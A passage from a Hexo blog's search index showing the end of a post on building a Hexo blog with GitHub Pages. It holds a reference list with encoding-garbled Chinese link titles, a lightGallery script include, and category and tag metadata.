hexo b</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="å‚è€ƒèµ„æ–™ï¼š"></a>å‚è€ƒèµ„æ–™ï¼š</h1><p><a href="http://luuman.github.io/2015/12/25/GitHub+Hexo/">ä½¿ç”¨GitHubæ­å»ºHexoåšå®¢</a><br><a href="http://luuman.github.io/2015/12/27/Hexo-plug/">Hexoæ’ä»¶å®‰è£…</a><br><a href="http://ibruce.info/2013/11/22/hexo-your-blog/">hexoä½ çš„åšå®¢</a><br><a href="http://www.jianshu.com/p/05289a4bc8b2#">å¦‚ä½•æ­å»ºä¸€ä¸ªç‹¬ç«‹åšå®¢â€”â€”ç®€æ˜Github Pagesä¸Hexoæ•™ç¨‹</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
